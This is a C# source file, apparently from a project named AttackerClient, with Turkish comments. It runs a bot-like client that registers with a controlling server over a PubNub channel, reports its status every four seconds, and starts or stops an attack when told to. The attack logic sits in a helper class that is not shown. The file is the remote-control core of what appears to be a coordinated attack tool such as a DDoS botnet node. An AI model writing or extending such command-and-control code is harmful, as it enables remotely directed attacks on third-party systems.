using AtackerDTO;
using AttackerCommon;
using ChannelController;
using PubnubApi;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Timers;

namespace AttackerClient
{
    class Program
    {
        Thread trdAttack = null;
        static string SenderId;
        static ClientStatusType Status;
        static string Data;
        static Pubnub pubnub;
        const int SendStatusMessageInterval = 4000;

        static void Main(string[] args)
        {
            SenderId = Identity.CreateNewID();
            Status = ClientStatusType.Normal;
            Data = String.Empty;
            pubnub = ChannelHelper.InitializePubNubClient();

            //Client'ın bilgileri server ile paylaşılıyor
            ClientController.PublishStatusMessage(pubnub, SenderId, ref Status, ref Data);

            //Mesajların alınması için listener yaratılıyor
            Listener listener = new Listener(pubnub);
            listener.AddListener(message =>
            {
                HandleMessage(message, pubnub, SenderId);
                return true;
            });

            //Sunucuya durum bilgisi gönderilmesi için bir timer yaratılıyor
            System.Timers.Timer tmrStatusMessage = new System.Timers.Timer();
            tmrStatusMessage.Elapsed += Timer_Elapsed; ;
            tmrStatusMessage.Interval = SendStatusMessageInterval;
            tmrStatusMessage.Start();

            Console.ReadLine();
        }

        private static void Timer_Elapsed(object sender, ElapsedEventArgs e)
        {
            ClientController.PublishStatusMessage(pubnub, SenderId, ref Status, ref Data);
        }

        /// <summary>
        /// Gönderilen mesajı yorumlar ve gereken işlemi başlatır
        /// </summary>
        /// <param name="message"></param>
        /// <param name="pubnub"></param>
        /// <param name="SenderId"></param>
        /// <param name="Status"></param>
        /// <param name="Data"></param>
        public static void HandleMessage(MessageDTO message, Pubnub pubnub, string SenderId)
        {
            /*
             Eğer client tarafından karşılanan bir mesaj ise bu değer true yapılır
             */
            bool isHandled = false;

            switch (message.MessageType)
            {
                case MessageType.TextToClients:
                    ClientController.WriteMessage(message.Data);
                    isHandled = true;
                    break;
                case MessageType.StartAttack:
                    ClientController.StartAttack(ref Status, ref Data, message.Data, (ex) =>
                    {
                        Status = ClientStatusType.Error;
                        Data = ex.Message;
                        return false;
                    });
                    isHandled = true;
                    break;
                case MessageType.StopAttack:
                    ClientController.StopAttack(ref Status, ref Data);
                    isHandled = true;
                    break;
                default:
                    break;
            }

            //Eğer mesaj handle edildiyse son durum server ile paylaşılıyor
            if (isHandled)
            {
                ClientController.PublishStatusMessage(pubnub, SenderId, ref Status, ref Data);
            }
        }


    }
}
